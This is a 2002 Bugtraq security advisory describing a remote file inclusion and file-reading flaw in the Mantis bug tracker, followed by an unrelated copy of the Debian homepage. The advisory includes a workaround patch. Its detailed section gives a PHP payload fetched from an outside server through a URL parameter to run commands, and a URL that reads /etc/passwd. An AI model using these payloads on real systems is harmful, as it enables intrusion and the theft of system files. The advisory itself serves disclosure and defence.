=== Content from marc.info_2805cd92_20250125_121505.html ===

```
[[prev in list](?l=bugtraq&m=102978924821040&w=2)] [[next in list](?l=bugtraq&m=102978035010987&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Mantis Advisory/2002-05] Arbitrary code execution and file
From:       [Jeroen Latour <jlatour () calaquendi ! net>](?a=102932042600002&r=1&w=2)
Date:       [2002-08-19 6:49:32](?l=bugtraq&r=1&w=2&b=200208)
[Download RAW [message](?l=bugtraq&m=102978711618648&q=mbox) or [body](?l=bugtraq&m=102978711618648&q=raw)]

[Mantis Advisory/2002-05] Arbitrary code execution and file reading
vulnerability in Mantis

   0. Table of Contents

     1. Introduction
     2. Summary / Impact analysis
     3. Affected versions
     4. Workaround / Solution
     5. Detailed explanation
       5.1 Arbitrary code execution
       5.2 Displaying local files
     6. Credit
     7. Contact details

   1. Introduction

Mantis is an Open Source web-based bugtracking system, written in PHP,
which uses the MySQL database server. It is being actively developed by a
small group of developers, and is considered to be in the beta stage.

   2. Summary / Impact analysis

Mantis allows the user to configure a file to be included at the top or
bottom, a file which contains the CSS stylesheets and a file which contains
meta tags. These files are set in default/config_inc2.php, and can be
overridden in config_inc.php.

For some obscure reason, config_inc2.php only initialised the variables if
it wasn't already set. This means that someone can set either
$g_bottom_include_page, $g_top_include_page, $g_css_include_file or
$g_meta_include_file using GET/POST parameters, or through a cookie.

Not all of these can be exploited to execute arbitrary code but all of them
can be used to read any file on the server readable to the webserver user.

Mantis 0.17.4 removes the isset() checks from default/config_inc2.php and
checks whether any of the four variables were set by a user. The latter
checks are added to ensure that even when someone has used
default/config_inc2.php to set configuration values, this vulnerability
will still be closed.

Mantis installations which override all of the four previously mentioned
variables in their config_inc.php are not affected.
Note that an account to the Mantis installation is not required to exploit
this vulnerability, as login_page.php and core_html_API.php are vulnerable
as well.

   3. Affected versions

The following versions are known to be affected:
   Mantis 0.17.3
   Mantis 0.17.2
   Mantis 0.17.1
   Mantis 0.17.0

The following versions are known to be unaffected:
   Mantis 0.17.4a
   Mantis 0.17.4
   Any version below Mantis 0.17.0 (*)

* = Except when the mentioned variables are not initialised anywhere, which
shouldn't occur if a seperate config_ing.php file is used.

   4. Workaround / Solution

Mantis 0.17.4 removes the isset() checks, and some paranoia checks which
prevent this vulnerability.
All users are recommended to upgrade to this version as soon as possible.

If an upgrade is not possible, the vulnerability can be closed by inserting
the following lines in core_API.php:
   if ( isset($HTTP_GET_VARS['g_top_include_file']) ||
     isset($HTTP_POST_VARS['g_top_include_file']) ||
     isset($HTTP_COOKIE_VARS['g_top_include_file']) ) {
     exit;
   }

   if ( isset($HTTP_GET_VARS['g_bottom_include_page']) ||
     isset($HTTP_POST_VARS['g_bottom_include_page']) ||
     isset($HTTP_COOKIE_VARS['g_bottom_include_page']) ) {
     exit;
   }

   if ( isset($HTTP_GET_VARS['g_css_include_file']) ||
     isset($HTTP_POST_VARS['g_css_include_file']) ||
     isset($HTTP_COOKIE_VARS['g_css_include_file']) ) {
     exit;
   }

   if ( isset($HTTP_GET_VARS['g_meta_include_file']) ||
     isset($HTTP_POST_VARS['g_meta_include_file']) ||
     isset($HTTP_COOKIE_VARS['g_meta_include_file']) ) {
     exit;
   }

   5. Detailed explanation

     5.1 Arbitrary code execution

To execute arbitrary PHP code using this vulnerability, an attacker only
has to store the PHP code (s)he wishes to execute in a textfile, make this
available on a webserver accessible by the Mantis installation and point
the $g_meta_include_file or the $g_css_include_file variable to that location.

For example, we create a file with the following content:
   <?php
     system('ls');
     exit;
   ?>

We make this file available on a webserver, for example at
<http://server.mynetwork.net/listings.txt>
If the Mantis installation does not have access to the internet, the file
should be stored on an internal server.

We then point our browser to
<http://mantis.server.com/mantis/login_page.php?g_meta_include_file=http://server.mynetwork.net/listings.txt>
 Any Mantis page that displays something will do. However, login_page.php
does not require an account.

This will execute the following call:
   include('<http://server.mynetwork.net/listings.txt>');

This instructs PHP to download listings.txt and parse it as a PHP script.
In this case, the browser should print a file listing of the current directory.

     5.2 Displaying local files

It is also possible to view any file available to the web user. The method
is more or less the same, although in this case we do not let the server
include a file we wrote, but just a local file we specify:

<http://mantis.server.com/mantis/login_page.php?g_css_include_file=/etc/passwd>

This will display the specified file if the webserver user has permission
to read that file.

This vulnerability can be exploited using any of the 4 variables specified
in section 2.

   6. Credit

This vulnerability was reported by Andrew Johnson and independently by the
Debian Security Team.

   7. Contact details

The latest version of Mantis is always available from:
     <http://mantisbt.sourceforge.net/>
The current version is 0.17.4a, which can be downloaded from
     <http://mantisbt.sourceforge.net/download.php3>

If you have any questions about this vulnerability, or wish to report
another, you can contact the developers at:
     mantisbt-security@lists.sourceforge.net
This is a private mailinglist, readable only by a few developers.

The latest version of this and other advisories can be found at:
     <http://mantisbt.sourceforge.net/security.php3>

[[prev in list](?l=bugtraq&m=102978924821040&w=2)] [[next in list](?l=bugtraq&m=102978035010987&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.debian.org_f3990771_20250125_121505.html ===

[![Debian](./Pics/openlogo-50.png)](./ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

# Debian

# The Community

## Debian is a Community of People!

### DC24 Group Photo

![DebConf23 Group Photo](Pics/debconf24_group_photo.jpg)

### MiniDebConf Berlin 2024

![Group photo of the MiniDebConf Berlin 2024](Pics/mini-dc24-berlin.jpg)

### MiniDebConf BrasÃ­lia 2023

![Group photo of the MiniDebConf BrasÃ­lia 2023](Pics/mini-dc23-brasilia.jpg)

### Screenshot Calamares Installer

![Screenshot from the Calamares installer](Pics/calamares-bookworm.png)

### Debian is like a Swiss Army Knife

![Debian is like a Swiss Army Knife](Pics/debian-swiss-knife-hands-1024x576.jpg)

### People have fun with Debian

![Debian people at Debconf18 in Hsinchu really having fun](Pics/debian-funny-people-1024x576.jpg)

[![](Pics/users.svg)](intro/people)

## [People](intro/people)

Who we are and what we do

[![](Pics/heartbeat.svg)](intro/philosophy)

## [Our Philosophy](intro/philosophy)

Why we do it, and how we do it

[![](Pics/user-plus.svg)](devel/join/)

## [Get Involved, Contribute](devel/join/)

How you can join us!

[![](Pics/list.svg)](intro/index#community)

## [More...](intro/index#community)

Additional information about the Debian community

# The Operating System

## Debian is a complete Free Operating System!

![Debian](Pics/debian-logo-1024x576.png)
[Download](https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-12.9.0-amd64-netinst.iso)
[Other downloads](distrib)

[![](Pics/trophy.svg)](intro/why_debian)

## [Why Debian](intro/why_debian)

What makes Debian special

[![](Pics/life-ring.svg)](support)

## [User Support](support)

Getting help and documentation

[![](Pics/security.svg)](security/)

## [Security Updates](security/)

Debian Security Advisories (DSA)

[![](Pics/list.svg)](intro/index#software)

## [More...](intro/index#software)

Further links to downloads and software

---

# Project News

## News and Announcements about Debian

17January2025[The Debian Project mourns the loss of Steve Langasek (vorlon)](News/2025/20250117)
11January2025[Updated Debian 12: 12.9 released](News/2025/20250111)
19November2024[The Debian Project mourns the loss of JÃ©rÃ©my Bobbio (Lunar)](News/2024/20241119)
31August2024[Updated Debian 11: 11.11 released](News/2024/2024083102)
14August2024[Security support for Bullseye handed over to the LTS team](News/2024/20240814)

[All the news](News)
[RSS](News/news)

---

This page is also available in the following languages:
Select your language
català
dansk
Deutsch
español
français
Galego
Indonesia
Italiano
magyar
Nederlands
norsk (bokmål)
polski
Português
suomi
svenska
Tiếng Việt
Български (Bəlgarski)
Русский (Russkij)
українська (ukrajins'ka)
عربية (Arabiya)
中文(简)
中文(HK)
中文(繁)
한국어 (Korean)
Ελληνικά (Ellinika)
فارسی (Farsi)

How to set [the default document language](./intro/cn)

---

See our [contact page](./contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Sat, Sep 16 13:09:56 UTC 2023

Last Built: Sun, Jan 19 23:26:10 UTC 2025

Copyright © 1997-2025 [SPI](https://www.spi-inc.org/) and others; See [license terms](./license)

Debian is a registered [trademark](./trademark) of Software in the Public Interest, Inc.


